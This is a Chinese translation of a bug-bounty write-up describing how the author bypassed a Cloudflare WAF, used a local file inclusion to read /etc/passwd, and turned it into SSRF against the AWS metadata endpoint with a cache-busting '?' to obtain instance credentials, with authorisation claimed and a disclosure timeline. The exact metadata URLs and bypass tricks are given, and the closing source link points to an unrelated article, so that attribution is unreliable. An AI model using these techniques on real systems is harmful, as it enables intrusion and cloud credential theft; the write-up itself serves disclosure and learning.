> 原文链接: https://www.anquanke.com//post/id/177318 


# 如何获得印度最大股票经纪公司的AWS凭证


                                阅读量   
                                **246380**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/dm/1024_538_/t0149d7bb804b2d6e8a.png)](https://p1.ssl.qhimg.com/dm/1024_538_/t0149d7bb804b2d6e8a.png)



大家好，这篇文章我将讲述如何绕过一系列阻碍最终获得印度最大股票经纪公司的AWS（即Amazon Web Services，是亚马逊公司的云计算IaaS和PaaS平台服务）的访问凭证。简单来说，我需要先绕过WAF，然后再破解Web的缓存机制，最后获得AWS账户凭据。

> 请注意，我的一系列操作都是在相关公司的许可下完成的

在渗透测试的第一阶段，我发现一些网站的端点存在文件交互，所以我测试了一下LFI（本地文件包含）漏洞，结果发现CloudFlare防火墙挡在我的前面。

[![](https://nosec.org/avatar/uploads/attach/image/f27588748a8e79314d87a83129bc9b03/33.png)](https://nosec.org/avatar/uploads/attach/image/f27588748a8e79314d87a83129bc9b03/33.png)

要绕过CloudFlare的WAF，最简单的方法之一就是找到真实IP，绕过WAF直接访问，希望他们的服务器没有设置访问IP的白名单。

[![](https://nosec.org/avatar/uploads/attach/image/e872b4be40f3b62c5909645c604f3aa0/44.png)](https://nosec.org/avatar/uploads/attach/image/e872b4be40f3b62c5909645c604f3aa0/44.png)

为了找到服务器的真实IP，我直接使用了命令`dig [www.readacted.com](http://www.readacted.com)`，结果很幸运直接得到了结果。

[![](https://nosec.org/avatar/uploads/attach/image/e4fc63a46d7b3ed18b5d073739eb8ee5/55.png)](https://nosec.org/avatar/uploads/attach/image/e4fc63a46d7b3ed18b5d073739eb8ee5/55.png)

然后只需在电脑的`hosts`文件中配置一下网站和IP的对应关系，即可绕过WAF。接着我尝试使用LFI读取`/etc/passwd`，得到的响应如下：

[![](https://nosec.org/avatar/uploads/attach/image/88920606cf3a6c21b85c0f7b4710091f/66.png)](https://nosec.org/avatar/uploads/attach/image/88920606cf3a6c21b85c0f7b4710091f/66.png)

OK，这是一个很明显的本地文件读取漏洞。而当我搜索这个真实IP的whois信息时，发现它属于AWS。于是，我的下一个目标是通过利用SSRF漏洞读取AWS的帐户凭据，因为我在这个LFI漏洞点看到过URL作为参数输入的情况。我调用了API尝试读取AWS实例的元数据（[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)）。

[![](https://nosec.org/avatar/uploads/attach/image/abf35b64421ef564346453a86c7f9271/77.png)](https://nosec.org/avatar/uploads/attach/image/abf35b64421ef564346453a86c7f9271/77.png)

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 06 Apr 2019 14:32:48 GMT
Content-Type: text/css;charset=UTF-8
Connection: close
Vary: Accept-Encoding
Strict-Transport-Security: max-age=15552000
X-frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Proxy-Cache: HIT
Content-Length: 0
```

但是，响应码虽然是200——这意味着确实有交互——但没有返回任何数据。为什么会这样？如果你看一下上面的响应头，你会发现服务器是`Nginx`，而响应头有一个`X-Proxy-Cache`，它代表Nginx缓存层的设置，其值为“HIT”，意味着当客户端试图访问AWS元数据的相关API时，服务器会首先在Nginx缓存层中寻找响应，而这个响应为空。

现在，为了从服务器获得真实的响应，我不得不绕过缓存层，首先我需要了解nginx缓存系统中URL缓存规则。

```
一些参考文献 - 
https://www.digitalocean.com/community/tutorials/how-to-implement-browser-caching-with-nginx-s-header-module-on-centos-7
https://www.howtoforge.com/make-browsers-cache-static-files-on-nginx
```

在经过一段时间的学习后，我所了解到的是，缓存一般来说是基于URL路由路径的，如果URL是`[https://somewebsite.com/a.html](https://somewebsite.com/a.html)`那么它很可能与缓存中的URL路由路径相匹配，那么它就会被导向缓存，但如果网址是`[https://somewebsite.com/a.html?](https://somewebsite.com/a.html?)`那么URL路由路径将不会与缓存中的URL路由路径相匹配，因此它将直接从服务器获得响应。简单来说，我只需要在原来的请求后面加上一个问号或其他特殊符号`[http://169.254.169.254/latest/meta-data?](http://169.254.169.254/latest/meta-data?)`，即可不匹配缓存中的URL路由路径，就会直接访问服务器，得到即时回应。以下是我得到的响应：

[![](https://nosec.org/avatar/uploads/attach/image/d27adc5c4e57c9dece4d6ada60a45975/88.png)](https://nosec.org/avatar/uploads/attach/image/d27adc5c4e57c9dece4d6ada60a45975/88.png)

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 06 Apr 2019 14:32:48 GMT
Content-Type: text/css;charset=UTF-8
Connection: close
Vary: Accept-Encoding
Strict-Transport-Security: max-age=15552000
X-frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Proxy-Cache: MISS
Content-Length: 315

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
product-codes
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

此时你可以看到响应头`X-Proxy-Cache`被设置为`MISS`，这意味着现在API调用绕过了缓存层，直接从服务器获取响应。

此时，我能够成功绕过缓存来利用SSRF。为了获得AWS帐户凭证，我调用了如下API读取AWS实例的元数据中的安全性凭证（AWS instance me tadata security credentials），使用的URL为：`[http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?](http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?)`。

正如我所预料的，访问成功：

[![](https://nosec.org/avatar/uploads/attach/image/0b02eb34e6382090e69f57168ad00bf1/99.png)](https://nosec.org/avatar/uploads/attach/image/0b02eb34e6382090e69f57168ad00bf1/99.png)

我获得了AWS访问ID，秘密访问密钥和令牌，我可以进入网站的AWS账户，获取敏感信息，进行下一步渗透。总结一下，我首先绕过了Cloudflare防火墙，找到了LFI漏洞，然后绕过Web缓存机制将其升级到SSRF漏洞，最后利用SSRF漏洞获得了AWS帐户凭据。



## 时间线

2019年4月6日 – 漏洞报告给有关公司。

2019年4月7日 – 漏洞已被修复。

2019年4月7日 – 重新测试并确认修复。

2019年4月9日 – 发放奖励。

谢谢你的阅读！

```
本文由白帽汇整理并翻译，不代表白帽汇任何观点和立场：https://nosec.org/home/detail/2521.html
来源：https://www.nccgroup.trust/us/our-research/private-key-extraction-qualcomm-keystore/
```
